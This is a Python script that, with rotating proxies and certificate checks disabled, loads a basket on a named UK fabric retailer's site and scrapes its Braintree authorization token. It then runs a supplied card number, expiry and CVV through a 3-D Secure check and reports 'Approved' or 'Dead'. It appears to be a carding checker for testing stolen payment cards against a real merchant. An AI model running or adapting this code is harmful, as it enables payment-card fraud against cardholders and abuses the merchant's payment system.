from utilsdf.functions import capture, random_proxy
from httpx import AsyncClient
from utilsdf.woocomerce_funcs import b3_vbv


async def vbv(cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True, verify=False, proxies=random_proxy()
    ) as s:

        r = await s.get(
            "https://www.justfabrics.co.uk/curtain-accessories/tape-and-buckram/3-pencil-pleat-tape/"
        )

        p2 = "qty=1&id=42&type=curtain-accessories&action=add-to-basket"

        r2 = await s.post(
            "https://www.justfabrics.co.uk/includes/add-to-basket.php", data=p2
        )

        r3 = await s.get("https://www.justfabrics.co.uk/designer-fabrics/cart.php")
        t3 = r3.text
        client = capture(t3, "braintree.client.create({", ")").strip()
        ey = capture(client, "authorization: '", "'")
        vbv, nonce = await b3_vbv(
            ey, "www.justfabrics.co.uk", "2.27", cc, month, year, cvv
        )

        if "authenticate_successful" in vbv or "authenticate_attempt_successful" in vbv:
            status = "Approved! ✅"
        else:
            status = "Dead! ❌"

        return status, vbv
